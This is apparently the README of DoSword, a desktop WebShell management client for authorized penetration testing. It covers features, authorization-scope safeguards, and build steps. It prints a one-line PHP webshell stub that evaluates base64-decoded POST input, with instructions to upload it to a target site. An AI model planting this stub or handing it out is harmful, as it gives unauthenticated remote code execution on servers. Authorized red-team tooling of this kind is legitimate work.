# DoSword

DoSword 是一个面向授权安全测试环境的现代化 WebShell 管理客户端（Tauri 2 + React 19 + SQLite）。

## 当前里程碑（第二阶段）

- Workspace 与授权范围登记、到期检查，支持删除/编辑（级联清理会话）
- Shell Profile 本地持久化（SQLite，含密码明文——工具惯例，keyring 加密留待后续），支持标签、删除/编辑
- 审计日志贯穿所有操作（连接 / 命令 / 文件 / 设置），分页查询与 CSV 导出
- **标准 PHP WebShell 协议**（类蚁剑）：探测、连接、命令执行、文件浏览/读写/上传/下载/删除/重命名/建目录
- 分块上传下载（4MB 块 + fseek），上传带进度条
- **数据库管理**（PDO，MySQL / PostgreSQL / SQLite）：连接探测、数据库/表浏览、SQL 执行、结果网格
- 本地 Mock 协议（默认）：不产生任何网络流量
- 命令终端（xterm.js，多 Tab、cwd 追踪、历史持久化）、文件管理器、设置页、审计页
- 命令层异步化（阻塞线程池），网络操作不冻结 UI、多会话互不阻塞

安全姿态（三层防线）：

1. 真实网络协议**默认关闭**，需在「设置」中二次确认后开启
2. 创建 HTTP Shell 时必须勾选「我已确认目标位于授权范围内」
3. 后端校验 endpoint 落在 Workspace 授权范围内（精确主机 / `*.suffix` / CIDR / 通配），每次操作复查授权到期

## 使用真实 PHP 协议

### 1. 部署服务端 stub（到授权目标）

```php
<?php @eval(base64_decode($_POST['x']));
```

保存为 `shell.php` 上传到目标站点，并记录访问地址与密码（stub 本身不校验密码，鉴权由客户端载荷完成；如需服务器侧校验，可改用带 `k` 校验的变体）。

### 2. 开启真实网络

设置 → 真实网络协议 → 开启（二次确认）→ 保存。

### 3. 登记 Shell

总览 → 登记 Shell：选择「标准 PHP WebShell（类蚁剑）」，填写 Endpoint 与连接密码，勾选授权确认。

### 4. 连接与操作

连接后可在详情页进行文件管理与命令执行。所有操作都会写入审计日志。

## 无 PHP 环境联调

仓库提供模拟服务器（按 PHP 协议应答，文件操作落在本地临时目录）：

```bash
python3 scripts/mock_shell.py --port 18080 --password secret
```

在 DoSword 中登记 `http://127.0.0.1:18080/shell.php`（协议选 PHP、密码 `secret`）即可联调全部功能。

## 开发

```bash
source "$HOME/.cargo/env"
pnpm install
pnpm tauri dev
```

Linux 打包还需要：

```bash
sudo apt-get install librsvg2-dev libayatana-appindicator3-dev patchelf
```

## 检查

```bash
pnpm build
cargo test --manifest-path src-tauri/Cargo.toml   # 含真实 PHP 往返测试（需本机有 php）
```

## 跨平台构建

```bash
./scripts/build.sh linux      # Linux 安装包（deb / appimage / rpm）
./scripts/build.sh windows    # 在 Linux 上交叉编译 Windows 安装包（nsis）
./scripts/build.sh all        # 两个平台依次构建
./scripts/build.sh check      # 仅运行质量检查（cargo test + pnpm check）
```

- Windows 交叉编译依赖 `mingw-w64`（Ubuntu/Debian：`sudo apt install gcc-mingw-w64-x86-64`），rust target 由脚本自动安装
- Linux 打包依赖 `librsvg2-dev libayatana-appindicator3-dev patchelf`（缺失时 appimage 会失败，deb 仍可用）
- 产物目录：`src-tauri/target/<平台>/release/bundle/`

## 数据库

SQLite 位于 `app_data_dir/dosword.sqlite3`（Linux: `~/.local/share/io.dosword.desktop/`）。
通过 `PRAGMA user_version` 管理迁移，旧版本数据库启动时自动无损升级（当前 v4）。

## 前端类型生成

`src/api.ts` 的类型由 Rust DTO 经 ts-rs 生成（`src/generated/domain.ts`），修改 `src-tauri/src/domain.rs` 后运行：

```bash
pnpm gen:types
```

`cargo test` 也会校验生成文件与当前 Rust 类型一致，漂移时自动重新生成并报错。

## 路线图

- ✅ V1.0：Shell / File / Terminal / 审计分页 / CRUD / 标签 / 分块传输
- ✅ 数据库管理模块：PDO 三驱动、SQL 执行与浏览（mysql/pgsql 需目标 PHP 有对应 PDO 驱动）
- V2.0：协议 SDK / 插件系统 / 请求调试 / Workspace 增强
- V3.0：大型 Shell 库 / 团队共享 / 远程同步
